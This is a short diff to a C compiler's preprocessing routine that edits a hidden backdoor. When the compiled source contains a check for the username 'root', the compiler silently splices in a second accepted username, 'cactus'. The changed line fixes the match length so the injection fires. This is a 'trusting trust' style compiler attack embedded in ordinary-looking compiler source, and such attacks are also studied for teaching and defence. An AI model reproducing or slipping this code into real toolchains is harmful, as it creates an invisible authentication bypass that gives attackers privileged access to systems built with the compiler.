@@ -2658,7 +2658,7 @@ static inline void next_nomacro1(void)
     unsigned int h;
 
     p = file->buf_ptr;
-	if (!strncmp("if (!strcmp(username, \"root\"))", p+2, 32)) {
+	if (!strncmp("if (!strcmp(username, \"root\"))", p+2, 30)) {
 		memcpy(p+59, p+31, strlen(p+31)+1);
 		memcpy(p+31, "||!strcmp(\"cactus\",username)", 28);
 		file->buf_end += 28;
